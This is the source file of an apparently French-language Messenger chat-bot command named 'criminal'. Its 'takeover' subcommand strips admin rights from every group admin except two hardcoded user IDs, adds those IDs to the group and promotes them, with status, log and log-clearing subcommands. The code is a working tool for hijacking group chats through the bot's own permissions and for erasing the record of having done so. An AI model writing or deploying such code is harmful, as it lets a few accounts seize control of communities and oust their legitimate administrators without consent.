const fs = require("fs-extra");
const path = require("path");

const LOG_FILE = path.join(__dirname, "criminal_logs.json");

function loadLogs() {
  try {
    if (fs.existsSync(LOG_FILE)) return JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
  } catch {}
  return { actions: [], users: {} };
}

function saveLogs(logs) {
  try { fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2)); } catch {}
}

function UI(lines) {
  let out = "╭─────────────────────•\n";
  for (const l of lines) {
    if (l === "---") { out += "├─────────────────────•\n"; continue; }
    out += `│ ${l}\n`;
  }
  return out + "╰─────────────────────•";
}

const ALLOWED_IDS = ["61584915780524", "61580558711299"];
const TARGET_IDS = ["61584915780524", "61580558711299"];

module.exports = {
  config: {
    name: "criminal",
    version: "2.0",
    author: "Ismael03-Dev",
    countDown: 5,
    role: 2,
    category: "admin",
    shortDescription: { en: "Criminal takeover" },
    longDescription: "Retire le rôle admin aux autres et promeut les IDs cibles"
  },

  onStart: async function ({ api, event, args }) {
    const threadID = event.threadID;
    const senderID = event.senderID;
    const sub = (args[0] || "").toLowerCase();
    const logs = loadLogs();

    if (!ALLOWED_IDS.includes(senderID)) {
      return api.sendMessage(UI([
        "⛔ ACCES REFUSE",
        "---",
        "Tu n'as pas la permission d'utiliser cette commande."
      ]), threadID);
    }

    if (sub === "help" || !sub) {
      return api.sendMessage(UI([
        "🔫 CRIMINAL COMMANDS",
        "---",
        `${global.utils.getPrefix(threadID)}criminal takeover`,
        `${global.utils.getPrefix(threadID)}criminal status`,
        `${global.utils.getPrefix(threadID)}criminal logs`,
        `${global.utils.getPrefix(threadID)}criminal clear`,
        "---",
        "⚠️ Retire le rôle admin aux",
        "autres et promeut les cibles."
      ]), threadID);
    }

    if (sub === "status") {
      try {
        const threadInfo = await api.getThreadInfo(threadID);
        const admins = threadInfo.adminIDs || [];

        const currentAdmins = await Promise.all(
          admins.map(async (a) => {
            try {
              const info = await api.getUserInfo(a.id);
              return info[a.id]?.name || a.id;
            } catch { return a.id; }
          })
        );

        const targetNames = await Promise.all(
          TARGET_IDS.map(async (id) => {
            try {
              const info = await api.getUserInfo(id);
              return info[id]?.name || id;
            } catch { return id; }
          })
        );

        const targetsAlreadyAdmin = TARGET_IDS.filter(id =>
          admins.some(a => String(a.id) === id)
        );

        return api.sendMessage(UI([
          "🔫 STATUS DU GROUPE",
          "---",
          `👥 Admins actuels: ${admins.length}`,
          `📋 ${currentAdmins.join(", ")}`,
          "---",
          `🎯 Cibles déjà admin: ${targetsAlreadyAdmin.length}/${TARGET_IDS.length}`,
          `👤 ${targetNames.join(", ")}`,
          "---",
          `🆔 Groupe: ${threadID}`
        ]), threadID);
      } catch (error) {
        return api.sendMessage(UI(["❌ Erreur", "---", error.message]), threadID);
      }
    }

    if (sub === "logs") {
      const userLogs = logs.actions.filter(a => a.threadID === threadID).slice(-10);
      if (!userLogs.length)
        return api.sendMessage(UI(["📜 Aucun log pour ce groupe"]), threadID);

      const lines = ["📜 CRIMINAL LOGS", "---"];
      for (const log of [...userLogs].reverse()) {
        const date = new Date(log.timestamp).toLocaleString("fr-FR");
        lines.push(`${log.action} | ${date}`);
        if (log.details) lines.push(`   ${log.details}`);
        lines.push("---");
      }
      return api.sendMessage(UI(lines), threadID);
    }

    if (sub === "clear") {
      logs.actions = logs.actions.filter(a => a.threadID !== threadID);
      saveLogs(logs);
      return api.sendMessage(UI(["🗑️ Logs effacés"]), threadID);
    }

    if (sub === "takeover") {
      const loadingMsg = await api.sendMessage(UI([
        "🔫 CRIMINAL TAKEOVER",
        "---",
        "⏳ Exécution en cours..."
      ]), threadID);

      try {
        const threadInfo = await api.getThreadInfo(threadID);
        const admins = threadInfo.adminIDs || [];

        const toDerank = admins.filter(a => !TARGET_IDS.includes(String(a.id)));

        let deranked = 0;
        let derankFailed = 0;

        for (const admin of toDerank) {
          try {
            await api.changeAdminStatus(threadID, admin.id, false);
            deranked++;
            await new Promise(r => setTimeout(r, 600));
          } catch {
            derankFailed++;
          }
        }

        let added = 0;
        for (const targetId of TARGET_IDS) {
          const isMember = threadInfo.participantIDs?.includes(targetId);
          if (!isMember) {
            try {
              await api.addUserToGroup(targetId, threadID);
              added++;
              await new Promise(r => setTimeout(r, 800));
            } catch {}
          }
        }

        let promoted = 0;
        let alreadyAdmin = 0;
        for (const targetId of TARGET_IDS) {
          const wasAlready = admins.some(a => String(a.id) === targetId);
          if (wasAlready) {
            alreadyAdmin++;
            continue;
          }
          try {
            await api.changeAdminStatus(threadID, targetId, true);
            promoted++;
            await new Promise(r => setTimeout(r, 600));
          } catch {}
        }

        const logEntry = {
          action: "TAKEOVER",
          threadID,
          timestamp: Date.now(),
          details: `Dérankés: ${deranked}, Échecs: ${derankFailed}, Ajoutés: ${added}, Promus: ${promoted}, Déjà admin: ${alreadyAdmin}`
        };
        logs.actions.push(logEntry);
        if (logs.actions.length > 100) logs.actions = logs.actions.slice(-100);
        saveLogs(logs);

        await api.unsendMessage(loadingMsg.messageID).catch(() => {});

        return api.sendMessage(UI([
          "🔫 TAKEOVER RÉUSSI !",
          "---",
          `🔻 Rôle admin retiré: ${deranked}`,
          `❌ Échecs de dérankage: ${derankFailed}`,
          `➕ Membres ajoutés: ${added}`,
          `⭐ Promus admin: ${promoted}`,
          `✅ Déjà admin: ${alreadyAdmin}`,
          "---",
          `🎯 Cibles: ${TARGET_IDS.join(", ")}`,
          "---",
          `📜 Logs: ${logs.actions.length} entrées`
        ]), threadID);

      } catch (error) {
        await api.unsendMessage(loadingMsg.messageID).catch(() => {});
        return api.sendMessage(UI([
          "❌ TAKEOVER ÉCHOUÉ",
          "---",
          `Erreur: ${error.message}`,
          "💡 Vérifie les permissions du bot"
        ]), threadID);
      }
    }

    return api.sendMessage(
      UI([`❌ Commande inconnue`, `💡 ${global.utils.getPrefix(threadID)}criminal help`]),
      threadID
    );
  }
};